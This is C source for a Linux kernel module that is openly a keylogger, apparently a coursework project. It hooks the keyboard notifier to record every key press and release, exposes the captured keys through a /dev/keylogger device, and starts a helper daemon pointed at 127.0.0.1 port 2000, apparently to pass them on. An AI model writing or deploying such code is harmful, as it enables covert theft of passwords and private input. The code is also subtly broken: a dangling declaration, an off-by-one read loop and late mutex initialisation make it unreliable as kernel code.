#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/mutex.h>
#include <asm/uaccess.h>

#define DEVICE_NAME "keylogger"     /* dev name as it appears in /proc/devices and /dev/ */
#define CLASS_NAME  "keylog"
#define BUFFER_LEN 2048

MODULE_LICENSE("GPL");              /* General Public License - required by keyboard_notifier */

static int major;                   /* major number assigned to device driver */
static struct class*  keyloggerClass  = NULL;
static struct device* keyloggerDevice = NULL;

static char dev_buffer[BUFFER_LEN];
static short begin = 0;
static short end = 0;
static short

/* The prototype functions for the character driver */
static int     device_open(struct inode *, struct file *);
static int     device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

static struct file_operations fops =
{
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

static int is_device_full(void)
{
    return (end + 1) % BUFFER_LEN == begin;
}

int start_deamon(void)
{
    struct subprocess_info *sub_info;
    char *argv[] = {"/media/sf_uxp-shared/deamon", "127.0.0.1", "2000", NULL};
    static char *envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
    if (sub_info == NULL)
    {
        return -ENOMEM;
    }

    return call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
}

int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE)
    {
        if (!is_device_full())
        {
            mutex_lock(&keyloggerDevice->mutex);
            dev_buffer[end] = (char) param->down;
            end = (end + 1) % BUFFER_LEN;
            dev_buffer[end] = (char) (param->value);
            end = (end + 1) % BUFFER_LEN;
            mutex_unlock(&keyloggerDevice->mutex);
        }
        else
        {

        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb =
{
    .notifier_call = log_key
};

static int __init keylogger_init(void)
{
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0)
    {
        printk(KERN_ALERT "Failed to register character device\n");
        return major;
    }

    keyloggerClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(keyloggerClass))
    {
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(keyloggerClass);
    }

    keyloggerDevice = device_create(keyloggerClass, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (IS_ERR(keyloggerDevice))
    {
        class_destroy(keyloggerClass);
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(keyloggerDevice);
    }

    register_keyboard_notifier(&nb);
    mutex_init(&keyloggerDevice->mutex);

    return start_deamon();
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    device_destroy(keyloggerClass, MKDEV(major, 0));
    class_unregister(keyloggerClass);
    class_destroy(keyloggerClass);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
    mutex_lock(&keyloggerDevice->mutex);

    /* copy data from the kernel data segment to the user data segment */
    unsigned short bytes_read;
    for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
    {
        put_user(dev_buffer[begin], buffer + bytes_read);
    }

    mutex_unlock(&keyloggerDevice->mutex);

    return bytes_read;
}

static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off)
{
    /* Unsupported operation */
    return -EINVAL;
}

static int device_open(struct inode *inode, struct file *file)
{
    return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
    return 0;
}